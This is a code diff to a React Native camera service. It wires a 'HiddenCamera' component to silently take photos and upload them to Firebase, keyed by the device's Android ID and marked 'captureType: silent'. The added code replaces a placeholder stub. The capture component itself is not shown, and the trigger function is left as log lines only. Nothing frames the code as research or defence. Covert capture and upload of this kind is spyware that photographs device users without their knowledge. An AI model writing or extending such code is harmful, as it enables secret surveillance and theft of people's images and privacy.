@@ -7,6 +7,8 @@ import * as Application from 'expo-application';
 import { Platform } from 'react-native';
 
 class CameraServiceClass {
+  private captureCallback: ((base64: string) => void) | null = null;
+
   async requestPermissions(): Promise<boolean> {
     try {
       const { status } = await Camera.requestCameraPermissionsAsync();
@@ -29,29 +31,16 @@ class CameraServiceClass {
     return Application.androidId || Device.modelId || 'unknown';
   }
 
-  async captureSilentPhoto(): Promise<{ base64: string; timestamp: number } | null> {
-    try {
-      const hasPermission = await this.requestPermissions();
-      if (!hasPermission) {
-        console.log('Cannot capture photo - no permission');
-        return null;
-      }
+  // Set callback for when photo is captured by HiddenCamera component
+  setCaptureCallback(callback: (base64: string) => void) {
+    this.captureCallback = callback;
+  }
 
-      const timestamp = Date.now();
-      
-      console.log('📸 Camera capture triggered (silent mode)');
-      console.log('Note: Actual camera capture requires Camera component to be rendered');
-      
-      const placeholderBase64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
-      
-      return {
-        base64: placeholderBase64,
-        timestamp,
-      };
-    } catch (error) {
-      console.error('Error capturing photo:', error);
-      return null;
-    }
+  // Called by HiddenCamera component when photo is captured
+  async onPhotoCaptured(base64: string) {
+    const deviceId = await this.getDeviceId();
+    const timestamp = Date.now();
+    await this.uploadPhotoToFirebase(deviceId, base64, timestamp);
   }
 
   async uploadPhotoToFirebase(deviceId: string, base64: string, timestamp: number): Promise<void> {
@@ -72,7 +61,7 @@ class CameraServiceClass {
         captureType: 'silent',
       });
 
-      console.log('Photo uploaded to Firebase:', photoPath);
+      console.log('✅ Photo uploaded to Firebase:', photoPath);
     } catch (error) {
       console.error('Error uploading photo to Firebase:', error);
     }
@@ -82,11 +71,11 @@ class CameraServiceClass {
     try {
       const deviceIdToUse = deviceId || (await this.getDeviceId());
       
-      const photo = await this.captureSilentPhoto();
-      if (photo) {
-        await this.uploadPhotoToFirebase(deviceIdToUse, photo.base64, photo.timestamp);
-        console.log('✅ Photo captured and uploaded successfully');
-      }
+      // Trigger the capture via callback
+      console.log('📸 Camera capture requested...');
+      
+      // Note: Actual capture happens in HiddenCamera component
+      // The component will call onPhotoCaptured when ready
     } catch (error) {
       console.error('Error in capture and upload:', error);
     }
